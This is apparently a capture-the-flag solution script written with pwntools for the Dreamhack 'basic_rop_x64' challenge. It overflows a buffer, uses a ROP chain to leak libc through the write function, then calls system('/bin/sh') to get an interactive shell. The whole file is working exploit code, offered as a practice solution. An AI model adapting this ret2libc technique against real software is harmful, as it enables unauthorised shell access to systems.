from pwn import *

def slog(name, addr): return success(': '.join([name, hex(addr)]))

context.log_level = 'debug'

p = process('./basic_rop_x64', env= {"LD_PRELOAD" : "./libc.so.6"})
# p = remote("host3.dreamhack.games", 18796)
e = ELF('./basic_rop_x64')
r = ROP(e)
libc = ELF('./libc.so.6')

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']
main = e.symbols['main']

pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_r15 = r.find_gadget(['pop rsi'])[0]
ret = r.find_gadget(['ret'])[0]
sh = list(libc.search(b"/bin/sh"))[0]

# === Stage 1 ===
payload = b"A" * 0x40 + b"B" * 0x8

# write(1, read_got, ...)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(8)
payload += p64(write_plt)

# return to main
payload += p64(main)

p.send(payload)
p.recvuntil(b"A" * 0x40)
read = u64(p.recvn(6) + b"\x00"*2)
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']
binsh = lb + sh

slog('read', read)
slog('lb', lb)
slog('system', system)

# === Stage 2 ===
payload = b"A" * 0x48

# system("/bin/sh")
payload += p64(pop_rdi) + p64(binsh)
print(type(binsh))
payload += p64(system)

p.send(payload)
p.recvn(0x40)

p.interactive()



